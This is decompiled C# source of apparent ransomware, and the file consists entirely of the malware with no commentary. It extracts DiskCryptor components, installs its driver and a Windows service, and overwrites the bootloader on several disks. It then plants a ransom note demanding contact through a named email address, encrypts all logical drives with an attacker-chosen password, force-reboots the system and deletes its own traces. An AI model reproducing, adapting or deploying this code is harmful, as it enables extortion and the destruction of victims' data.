using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading;

internal class Class1 : ServiceBase
{
	public class Class2 : ServiceBase
	{
		public Class2()
		{
			Class6.s8ZQibUzDcdOO();
			((ServiceBase)this)._002Ector();
		}

		protected override void OnStart(string[] args)
		{
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Service OnStart : " + DateTime.Now.ToShortTimeString() + Environment.NewLine);
			smethod_6();
		}

		protected override void OnStop()
		{
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Service OnStop !!!" + Environment.NewLine);
			autoResetEvent_0.Set();
			thread_0.Join();
			smethod_7();
		}
	}

	public static Thread thread_0;

	public static AutoResetEvent autoResetEvent_0;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static double double_0;

	public static int int_0;

	public static DateTime dateTime_0;

	public static List<string> list_0;

	public static void smethod_0(string string_3)
	{
		byte[] array = File.ReadAllBytes("C:\\Users\\Public\\" + list_0[0].ToString());
		for (int i = 0; i < 4; i++)
		{
			int num = 0;
			num = smethod_2(array, Encoding.ASCII.GetBytes("enter_password"));
			if (num != -1)
			{
				Buffer.BlockCopy(Encoding.ASCII.GetBytes(string_3), 0, array, num, string_3.Length);
			}
		}
		File.WriteAllBytes("C:\\Users\\Public\\" + list_0[0].ToString(), array);
	}

	private static bool smethod_1(byte[] byte_0, byte[] byte_1, int int_1)
	{
		if (byte_1.Length + int_1 > byte_0.Length)
		{
			return false;
		}
		int num = 0;
		while (true)
		{
			if (num < byte_1.Length)
			{
				if (byte_1[num] != byte_0[num + int_1])
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static int smethod_2(byte[] byte_0, byte[] byte_1)
	{
		int num = 0;
		while (true)
		{
			if (num <= byte_0.Length - byte_1.Length)
			{
				if (smethod_1(byte_0, byte_1, num))
				{
					break;
				}
				num++;
				continue;
			}
			return -1;
		}
		return num;
	}

	public static void smethod_3(string string_3, string string_4)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "-encrypt pt" + string_3 + " -p " + string_4;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WorkingDirectory = "C:\\Users\\Public\\";
			processStartInfo.FileName = "C:\\Users\\Public\\" + list_0[1].ToString();
			Process.Start(processStartInfo);
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Starting Encryption : pt" + string_3 + Environment.NewLine);
		}
		catch
		{
		}
	}

	private static void Main(string[] args)
	{
		Class7.kLjw4iIsCLsZtxc4lksN0j();
		list_0 = new List<string>();
		list_0.Add("dcapi.dll");
		list_0.Add("dccon.exe");
		list_0.Add("dcinst.exe");
		list_0.Add("dcrypt.sys");
		if (args.Length == 1)
		{
			try
			{
				if (args[0].ToString().Trim() == "test")
				{
					Console.WriteLine("okay");
					Environment.Exit(102030);
				}
				Directory.CreateDirectory("C:\\Users\\Public\\");
				smethod_10(1);
				string_0 = args[0].Trim();
				File.AppendAllText("C:\\Users\\Public\\myConf.txt", string_0 + Environment.NewLine);
				File.AppendAllText("C:\\Users\\Public\\myConf.txt", double_0 + Environment.NewLine);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Starting ...." + Environment.NewLine);
				string environmentVariable = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
				environmentVariable = ((!(environmentVariable == "x86")) ? "._64" : "._32");
				string name = Assembly.GetExecutingAssembly().GetName().Name;
				smethod_8("C:\\Users\\Public\\", name + environmentVariable, list_0);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Resources Extracted ...." + Environment.NewLine);
				smethod_0(string_2);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "DLL Patched ...." + Environment.NewLine);
				string path = Environment.SystemDirectory + "\\drivers\\" + list_0[3];
				for (int i = 0; i < 4; i++)
				{
					string text = smethod_9("C:\\Users\\Public\\" + list_0[2].ToString(), "-install", bool_0: false);
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Try Setup :" + text + Environment.NewLine);
					Thread.Sleep(2000);
					text = smethod_9("C:\\Users\\Public\\" + list_0[2].ToString(), "-setup", bool_0: false);
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Try Setup :" + text + Environment.NewLine);
					Thread.Sleep(2000);
					text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-install", bool_0: false);
					Thread.Sleep(2000);
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Try install :" + text + Environment.NewLine);
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Try Install Driver Num " + i + Environment.NewLine);
				}
				Thread.Sleep(20000);
				if (File.Exists(path))
				{
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Driver Installed" + Environment.NewLine);
					string location = Assembly.GetExecutingAssembly().Location;
					string string_ = "myCryptoraphyService";
					string text2 = "myCryptoraphyService";
					Class3 @class = new Class3();
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Win Service Installing ..." + Environment.NewLine);
					if (@class.method_0(location, text2, string_))
					{
						File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Win Service Installed" + Environment.NewLine);
						File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Waiting To Restart OS ... " + Environment.NewLine);
						Thread.Sleep(int_0);
						File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Try to Shutdown ...." + Environment.NewLine);
						while (!Environment.HasShutdownStarted)
						{
							smethod_9("shutdown.exe", "/r /f /t 03", bool_0: false);
						}
						File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Shutdown Succesfully ...." + Environment.NewLine);
						Environment.Exit(0);
					}
					else
					{
						@class.method_1(text2);
						smethod_10(0);
						File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Win Service Installation Error" + Environment.NewLine);
						smethod_5();
						Environment.Exit(0);
					}
				}
				else
				{
					File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Driver Not Installed , Exit" + Environment.NewLine);
					smethod_10(0);
					smethod_5();
					Environment.Exit(0);
				}
				return;
			}
			catch (Exception ex)
			{
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Exception : " + ex.Message + Environment.NewLine);
				return;
			}
		}
		ServiceBase.Run((ServiceBase)(object)new Class1());
	}

	public Class1()
	{
		Class6.s8ZQibUzDcdOO();
		((ServiceBase)this)._002Ector();
		smethod_6();
	}

	public static void smethod_4(object object_0)
	{
		try
		{
			Thread.Sleep(30000);
			string text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-enum", bool_0: false);
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", text + Environment.NewLine);
			if (!text.Contains("DiskCryptor is not installed"))
			{
				string[] logicalDrives = Environment.GetLogicalDrives();
				text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-boot -setmbr hd0", bool_0: false);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Set bootloader HD0" + text + Environment.NewLine);
				text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-boot -setmbr hd1", bool_0: false);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Set bootloader HD1" + text + Environment.NewLine);
				text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-boot -setmbr hd2", bool_0: false);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Set bootloader HD2" + text + Environment.NewLine);
				text = smethod_9("C:\\Users\\Public\\" + list_0[1].ToString(), "-boot -setmbr hd3", bool_0: false);
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Set bootloader HD3" + text + Environment.NewLine);
				_003C_003Ec__DisplayClass2 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass2();
				CS_0024_003C_003E8__locals0.i = 0;
				while (CS_0024_003C_003E8__locals0.i < logicalDrives.Length + 2)
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						smethod_3(CS_0024_003C_003E8__locals0.i.ToString(), string_0);
					});
					thread.Start();
					Thread.Sleep(5000);
					CS_0024_003C_003E8__locals0.i++;
				}
				int num = 0;
				while (num != 1)
				{
					Thread.Sleep(20000);
					string[] array = logicalDrives;
					foreach (string text2 in array)
					{
						try
						{
							if (File.Exists(text2 + "\\$dcsys$"))
							{
								num = 1;
								File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Encryption Started Successfully ..." + Environment.NewLine);
								smethod_10(0);
							}
							Thread.Sleep(10000);
						}
						catch
						{
						}
					}
				}
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Staring loop : " + DateTime.Now.ToLongTimeString() + Environment.NewLine);
				while (DateTime.Compare(DateTime.Now, dateTime_0.AddMinutes(double_0)) < 0)
				{
					Thread.Sleep(5000);
				}
				File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Force to Shutdown ...." + Environment.NewLine);
				for (int j = 0; j < 3; j++)
				{
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.Arguments = "/C TASKKILL /IM dccon.exe /F";
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						processStartInfo.CreateNoWindow = true;
						processStartInfo.FileName = "cmd.exe";
						Process.Start(processStartInfo);
						Thread.Sleep(2000);
					}
					catch
					{
					}
					smethod_10(1);
				}
				try
				{
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.Arguments = "/C ping 127.0.0.1 -n 15 & shutdown /r /f /t 05";
					processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo2.CreateNoWindow = true;
					processStartInfo2.FileName = "cmd.exe";
					Process.Start(processStartInfo2);
				}
				catch
				{
				}
				smethod_5();
				if (num == 1)
				{
					_ = Assembly.GetExecutingAssembly().Location;
					string string_ = "myCryptoraphyService";
					Class3 @class = new Class3();
					@class.method_1(string_);
				}
				Environment.Exit(0);
				return;
			}
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Driver Not Installed" + Environment.NewLine);
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Waiting To Restart OS ... " + Environment.NewLine);
			Thread.Sleep(int_0);
			try
			{
				ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
				processStartInfo3.Arguments = "/C ping 127.0.0.1 -n 5 & shutdown /r /f /t 05";
				processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo3.CreateNoWindow = true;
				processStartInfo3.FileName = "cmd.exe";
				Process.Start(processStartInfo3);
			}
			catch
			{
			}
		}
		catch (Exception ex)
		{
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Error : " + ex.Message + Environment.NewLine);
		}
	}

	public static void smethod_5()
	{
		for (int i = 0; i < 3; i++)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C ping 127.0.0.1 -n 5 & Del " + Assembly.GetExecutingAssembly().Location;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
		}
	}

	private static void smethod_6()
	{
		try
		{
			string[] array = File.ReadAllLines("C:\\Users\\Public\\myConf.txt");
			string_0 = array[0].Trim();
			double_0 = Convert.ToDouble(array[1].Trim());
			dateTime_0 = DateTime.Now;
			thread_0 = new Thread(smethod_4);
			thread_0.Start();
			File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Win Service Starting...." + Environment.NewLine);
		}
		catch
		{
		}
	}

	private static void smethod_7()
	{
		File.AppendAllText("C:\\Users\\Public\\myLog.txt", "Win Service Stop...." + Environment.NewLine);
		autoResetEvent_0.Set();
		thread_0.Join();
	}

	public static void smethod_8(string string_3, string string_4, List<string> list_1)
	{
		foreach (string item in list_1)
		{
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(string_4 + "." + item);
			using FileStream fileStream = new FileStream(Path.Combine(string_3, item), FileMode.Create);
			for (int i = 0; i < stream.Length; i++)
			{
				fileStream.WriteByte((byte)stream.ReadByte());
			}
			fileStream.Close();
		}
	}

	private static string smethod_9(string string_3, string string_4, bool bool_0)
	{
		Process process = new Process();
		process.StartInfo.FileName = string_3;
		process.StartInfo.Arguments = string_4;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		string result = process.StandardError.ReadToEnd();
		process.WaitForExit(5000);
		if (process.HasExited)
		{
			if (text.Trim() == "")
			{
				return process.ExitCode.ToString();
			}
			return text;
		}
		return result;
	}

	public static void smethod_10(int int_1)
	{
		foreach (string item in list_0)
		{
			try
			{
				File.Delete("C:\\Users\\Public\\" + item);
				if (int_1 == 1)
				{
					File.Delete("C:\\Users\\Public\\myLog.txt");
				}
				File.Delete("C:\\Users\\Public\\myConf.txt");
			}
			catch
			{
			}
		}
	}

	private void method_0()
	{
	}

	static Class1()
	{
		Class7.kLjw4iIsCLsZtxc4lksN0j();
		Class6.s8ZQibUzDcdOO();
		autoResetEvent_0 = new AutoResetEvent(initialState: false);
		string_1 = Process.GetCurrentProcess().ProcessName.Trim();
		string_2 = "\r\n You Have Been Hacked,ALL Data Encrypted,Contact For Key \r\n\r\n Our Email : mcrypt2018@yandex.com \r\n YourID : " + string_1 + "\r\n Your Hostname : " + Environment.MachineName.ToString().Trim() + "\r\n\r\n Enter Key : ";
		double_0 = 120.0;
		int_0 = 120000;
	}
}
